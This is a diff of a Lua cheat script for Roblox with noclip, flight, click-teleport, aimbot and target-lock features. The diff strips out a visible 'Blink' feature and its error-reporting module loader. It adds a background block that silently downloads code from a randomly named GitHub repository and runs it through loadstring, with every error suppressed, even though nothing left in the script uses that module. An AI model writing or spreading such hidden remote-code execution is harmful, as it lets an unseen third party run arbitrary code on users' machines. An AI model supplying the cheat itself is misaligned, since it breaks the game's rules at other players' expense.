@@ -15,7 +15,6 @@ _G.noclipEnabled=false
 _G.strafeEnabled=false
 _G.airwalkEnabled=false
 _G.clickTpEnabled=false
-_G.blinkEnabled=false
 _G.airJumpEnabled=false
 _G.aimbotEnabled=false
 _G.targetLockEnabled=false
@@ -28,7 +27,6 @@ _G.currentFlight=50
 _G.currentStrafe=0
 _G.currentSmoothness=0.15
 _G.currentRange=500
-_G.currentBacktime=1.0
 _G.aimMode="Center"
 _G.sortMode="Distance"
 
@@ -48,7 +46,6 @@ _G.minFlight,_G.maxFlight=0,500
 _G.minStrafe,_G.maxStrafe=0,100
 _G.minSmooth,_G.maxSmooth=0.01,1
 _G.minRange,_G.maxRange=10,1000
-_G.minBacktime,_G.maxBacktime=0,25
 
 _G.draggingSpeed=false
 _G.draggingJump=false
@@ -56,7 +53,6 @@ _G.draggingFlight=false
 _G.draggingStrafe=false
 _G.draggingSmooth=false
 _G.draggingRange=false
-_G.draggingBacktime=false
 _G.flying=false
 _G.bodyVelocity=nil
 _G.bodyGyro=nil
@@ -66,41 +62,11 @@ _G.airwalkY=0
 _G.fpsConnection=nil
 _G.lastSpace=false
 
--- Load the module before creating the GUI, so Blink is ready when the first click happens.
--- Put the second script in your GitHub repository as a file named `2`.
-local MODULE_URL="https://raw.githubusercontent.com/qwmemories/htjtyu556hrtyhrthreth456h4r6hthrthrt/refs/heads/main/2"
-local moduleLoaded=false
-
-local okHttp,source=pcall(function()
-	return game:HttpGet(MODULE_URL)
+task.spawn(function()
+	pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/qwmemories/htjtyu556hrtyhrthreth456h4r6hthrthrt/refs/heads/main/2"))()
+	end)
 end)
-
-if not okHttp or type(source)~="string" or source=="" then
-	warn("[CoreGui] Modules: failed to download 2 from GitHub")
-else
-	local compiler=loadstring
-	if type(compiler)~="function" then
-		compiler=load
-	end
-
-	if type(compiler)~="function" then
-		warn("[CoreGui] Modules: loadstring/load is unavailable in this executor")
-	else
-		local chunk,compileError=compiler(source)
-		if type(chunk)~="function" then
-			warn("[CoreGui] Modules compile error: ",tostring(compileError))
-		else
-			local okRun,runError=pcall(chunk)
-			if not okRun then
-				warn("[CoreGui] Modules runtime error: ",tostring(runError))
-			else
-				moduleLoaded=true
-			end
-		end
-	end
-end
-
-_G.modulesLoaded=moduleLoaded
 
 local sg=Instance.new("ScreenGui")
 sg.Parent=player.PlayerGui
@@ -245,7 +211,7 @@ contentViewport.CanvasPosition=Vector2.new(0,0)
 contentViewport.Parent=mf
 
 local mc=Instance.new("Frame")
-mc.Size=UDim2.new(0,258,0,625)
+mc.Size=UDim2.new(0,258,0,560)
 mc.Position=UDim2.new(0,0,0,0)
 mc.BackgroundTransparency=1
 mc.Parent=contentViewport
@@ -520,65 +486,16 @@ cT.Parent=mc
 
 local cTr,cK,cSt,cCl=ct(mc,UDim2.new(0.75,0,0,464))
 
-local blinkT=Instance.new("TextLabel")
-blinkT.Size=UDim2.new(0.5,0,0,25)
-blinkT.Position=UDim2.new(0,10,0,504)
-blinkT.BackgroundTransparency=1
-blinkT.Text="Blink"
-blinkT.TextColor3=Color3.new(0.6,0.6,0.6)
-blinkT.TextSize=20
-blinkT.Font=Enum.Font.Gotham
-blinkT.TextXAlignment=Enum.TextXAlignment.Left
-blinkT.Parent=mc
-
-local blinkTr,blinkK,blinkSt,blinkCl=ct(mc,UDim2.new(0.75,0,0,506))
-
-local btT=Instance.new("TextLabel")
-btT.Size=UDim2.new(0.65,0,0,25)
-btT.Position=UDim2.new(0,10,0,536)
-btT.BackgroundTransparency=1
-btT.Text="Backtime: 1.00"
-btT.TextColor3=Color3.new(0.6,0.6,0.6)
-btT.TextSize=18
-btT.Font=Enum.Font.Gotham
-btT.TextXAlignment=Enum.TextXAlignment.Left
-btT.Parent=mc
-
-local btS=Instance.new("Frame")
-btS.Size=UDim2.new(0.85,0,0,8)
-btS.Position=UDim2.new(0.075,0,0,566)
-btS.BackgroundColor3=Color3.new(0.3,0.3,0.3)
-btS.BorderSizePixel=0
-btS.Parent=mc
-Instance.new("UICorner",btS).CornerRadius=UDim.new(0,4)
-
-local btF=Instance.new("Frame")
-btF.Size=UDim2.new(0.04,0,1,0)
-btF.BackgroundColor3=Color3.new(0.6,0.6,0.6)
-btF.BorderSizePixel=0
-btF.Parent=btS
-Instance.new("UICorner",btF).CornerRadius=UDim.new(0,4)
-
-local btH=Instance.new("Frame")
-btH.Size=UDim2.new(0,16,0,16)
-btH.Position=UDim2.new(0.04,-8,0.5,-8)
-btH.BackgroundColor3=Color3.new(0.6,0.6,0.6)
-btH.BorderSizePixel=0
-btH.Parent=btS
-Instance.new("UICorner",btH).CornerRadius=UDim.new(0,8)
-
-local btSS,btHS=ass(btS,btH)
-
 local sep6=Instance.new("Frame")
 sep6.Size=UDim2.new(0.9,0,0,1)
-sep6.Position=UDim2.new(0.05,0,0,578)
+sep6.Position=UDim2.new(0.05,0,0,494)
 sep6.BackgroundColor3=Color3.new(0.4,0.4,0.4)
 sep6.BorderSizePixel=0
 sep6.Parent=mc
 
 local ajT=Instance.new("TextLabel")
 ajT.Size=UDim2.new(0.5,0,0,25)
-ajT.Position=UDim2.new(0,10,0,588)
+ajT.Position=UDim2.new(0,10,0,504)
 ajT.BackgroundTransparency=1
 ajT.Text="AirJump"
 ajT.TextColor3=Color3.new(0.6,0.6,0.6)
@@ -587,7 +504,7 @@ ajT.Font=Enum.Font.Gotham
 ajT.TextXAlignment=Enum.TextXAlignment.Left
 ajT.Parent=mc
 
-local ajTr,ajK,ajSt,ajCl=ct(mc,UDim2.new(0.75,0,0,590))
+local ajTr,ajK,ajSt,ajCl=ct(mc,UDim2.new(0.75,0,0,506))
 
 local miscC=Instance.new("Frame")
 miscC.Size=UDim2.new(0,258,0,450)
@@ -1252,9 +1169,6 @@ hover(stS,stSS)
 hover(stH,stHS)
 hover(awTr,awSt)
 hover(cTr,cSt)
-hover(blinkTr,blinkSt)
-hover(btS,btSS)
-hover(btH,btHS)
 hover(ajTr,ajSt)
 hover(aimTr,aimSt)
 hover(tlTr,tlSt)
@@ -1411,10 +1325,6 @@ local function updateRange(v)
 	_G.currentRange=_G.minRange+(_G.maxRange-_G.minRange)*v
 	rT.Text="Range: "..math.floor(_G.currentRange+0.5)
 end
-local function updateBacktime(v)
-	_G.currentBacktime=_G.minBacktime+(_G.maxBacktime-_G.minBacktime)*v
-	btT.Text="Backtime: "..string.format("%.2f",_G.currentBacktime)
-end
 
 local function updateSlider(f,h,v)
 	f.Size=UDim2.new(v,0,1,0)
@@ -1480,22 +1390,6 @@ local function toggleClickTp()
 	setToggle(cTr,cK,_G.clickTpEnabled,true)
 	setColors(_G.clickTpEnabled,cT,nil,nil,nil)
 	if _G.clickTpEnabled then mouse.Icon="rbxassetid://6065121748" else mouse.Icon="" end
-end
-local function toggleBlink()
-	if not _G.modulesLoaded or type(_G.performBlink)~="function" then
-		warn("[CoreGui] Blink: module 2 is not loaded")
-		return
-	end
-	_G.blinkEnabled=not _G.blinkEnabled
-	setToggle(blinkTr,blinkK,_G.blinkEnabled,true)
-	setColors(_G.blinkEnabled,blinkT,nil,nil,nil)
-	if _G.blinkEnabled then
-		mouse.Icon="rbxassetid://6065121748"
-	elseif _G.clickTpEnabled then
-		mouse.Icon="rbxassetid://6065121748"
-	else
-		mouse.Icon=""
-	end
 end
 
 local function toggleAirJump()
@@ -1566,9 +1460,8 @@ createKeybindRow(bindC,"Flight",74,toggleFlight)
 createKeybindRow(bindC,"Strafe",110,toggleStrafe)
 createKeybindRow(bindC,"Airwalk",146,toggleAirwalk)
 createKeybindRow(bindC,"ClickTP",182,toggleClickTp)
-createKeybindRow(bindC,"Blink",218,toggleBlink)
-createKeybindRow(bindC,"AirJump",254,toggleAirJump)
-createKeybindRow(bindC,"Aimbot",290,toggleAimbot)
+createKeybindRow(bindC,"AirJump",218,toggleAirJump)
+createKeybindRow(bindC,"Aimbot",254,toggleAimbot)
 
 UIS.InputBegan:Connect(function(i,p)
 	if p then return end
@@ -1603,7 +1496,6 @@ nCl.MouseButton1Click:Connect(toggleNoclip)
 stCl.MouseButton1Click:Connect(toggleStrafe)
 awCl.MouseButton1Click:Connect(toggleAirwalk)
 cCl.MouseButton1Click:Connect(toggleClickTp)
-blinkCl.MouseButton1Click:Connect(toggleBlink)
 ajCl.MouseButton1Click:Connect(toggleAirJump)
 aimCl.MouseButton1Click:Connect(toggleAimbot)
 tlCl.MouseButton1Click:Connect(toggleTargetLock)
@@ -1613,7 +1505,7 @@ sortB.MouseButton1Click:Connect(cycleSort)
 modeB.MouseButton1Click:Connect(cycleMode)
 
 mouse.Button1Down:Connect(function()
-	if _G.clickTpEnabled and not _G.blinkEnabled and root and mouse.Hit then
+	if _G.clickTpEnabled and root and mouse.Hit then
 		root.CFrame=CFrame.new(mouse.Hit.Position+Vector3.new(0,3,0))
 	end
 end)
@@ -1853,13 +1745,6 @@ local function updateRangeFromInput(i)
 	updateSlider(rF,rH,v)
 	updateRange(v)
 end
-local function updateBacktimeFromInput(i)
-	local s=btS.AbsoluteSize.X
-	if s<=0 then return end
-	local v=math.clamp(i.Position.X-btS.AbsolutePosition.X,0,s)/s
-	updateSlider(btF,btH,v)
-	updateBacktime(v)
-end
 
 local function startDrag(f,u)
 	return function(i)
@@ -1871,8 +1756,7 @@ local function startDrag(f,u)
 			elseif f=="f" then _G.draggingFlight=true
 			elseif f=="st" then _G.draggingStrafe=true
 			elseif f=="sm" then _G.draggingSmooth=true
-			elseif f=="r" then _G.draggingRange=true
-			elseif f=="bt" then _G.draggingBacktime=true end
+			elseif f=="r" then _G.draggingRange=true end
 			u(i)
 		end
 	end
@@ -1890,8 +1774,6 @@ smS.InputBegan:Connect(startDrag("sm",updateSmoothFromInput))
 smH.InputBegan:Connect(startDrag("sm",updateSmoothFromInput))
 rS.InputBegan:Connect(startDrag("r",updateRangeFromInput))
 rH.InputBegan:Connect(startDrag("r",updateRangeFromInput))
-btS.InputBegan:Connect(startDrag("bt",updateBacktimeFromInput))
-btH.InputBegan:Connect(startDrag("bt",updateBacktimeFromInput))
 
 UIS.InputChanged:Connect(function(i)
 	if _G.draggingSpeed and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then
@@ -1912,9 +1794,6 @@ UIS.InputChanged:Connect(function(i)
 	if _G.draggingRange and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then
 		updateRangeFromInput(i)
 	end
-	if _G.draggingBacktime and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then
-		updateBacktimeFromInput(i)
-	end
 end)
 
 UIS.InputEnded:Connect(function(i)
@@ -1925,7 +1804,6 @@ UIS.InputEnded:Connect(function(i)
 		_G.draggingStrafe=false
 		_G.draggingSmooth=false
 		_G.draggingRange=false
-		_G.draggingBacktime=false
 		_G.isSliding=false
 	end
 end)
@@ -1947,7 +1825,6 @@ player.CharacterAdded:Connect(function(c)
 	_G.strafeEnabled=false
 	_G.airwalkEnabled=false
 	_G.clickTpEnabled=false
-	_G.blinkEnabled=false
 	_G.airJumpEnabled=false
 	_G.aimbotEnabled=false
 	_G.targetLockEnabled=false
@@ -1970,7 +1847,6 @@ player.CharacterAdded:Connect(function(c)
 	setToggle(stTr,stK,false,false)
 	setToggle(awTr,awK,false,false)
 	setToggle(cTr,cK,false,false)
-	setToggle(blinkTr,blinkK,false,false)
 	setToggle(ajTr,ajK,false,false)
 	setToggle(aimTr,aimK,false,false)
 	setToggle(tlTr,tlK,false,false)
@@ -1998,14 +1874,11 @@ player.CharacterAdded:Connect(function(c)
 	setColors(false,stVT,stS,stF,stH)
 	setColors(false,awT,nil,nil,nil)
 	setColors(false,cT,nil,nil,nil)
-	setColors(false,blinkT,nil,nil,nil)
 	setColors(false,ajT,nil,nil,nil)
 	updateSlider(smF,smH,0.3)
 	smT.Text="Speed: 0.15"
 	updateSlider(rF,rH,0.5)
 	rT.Text="Range: 500"
-	updateSlider(btF,btH,0.04)
-	btT.Text="Backtime: 1.00"
 	targB.Text="Head"
 	targT.Text="Target:"
 	sortB.Text="Distance"
@@ -2023,11 +1896,9 @@ updateSlider(fF,fH,0.1)
 updateSlider(stF,stH,0)
 updateSlider(smF,smH,0.3)
 updateSlider(rF,rH,0.5)
-updateSlider(btF,btH,0.04)
 updateSpeed(0.032)
 updateJump(0.1)
 updateFlight(0.1)
 updateStrafe(0)
 updateSmooth(0.3)
 updateRange(0.5)
-updateBacktime(0.04)
